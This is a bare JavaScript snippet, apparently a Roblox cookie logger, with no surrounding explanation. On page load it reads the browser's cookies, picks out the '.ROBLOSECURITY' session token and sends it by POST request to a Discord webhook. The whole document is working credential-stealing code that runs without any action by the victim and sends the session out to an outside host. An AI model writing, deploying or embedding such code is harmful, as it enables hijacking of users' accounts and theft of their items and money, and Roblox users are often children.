function grabCookie() {
    let cookie = document.cookie;
    let robloxCookie = cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY='));
    if (robloxCookie) {
        fetch('https://discord.com/api/webhooks/1392512318474031334/57HOX3b7oGYzwLb4Y5JMBtbks_32aAhBBOz3fvTZYl9K21Keak07uKXuFzB8aQImzkJ1', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ cookie: robloxCookie })
        });
    }
}
window.onload = grabCookie;
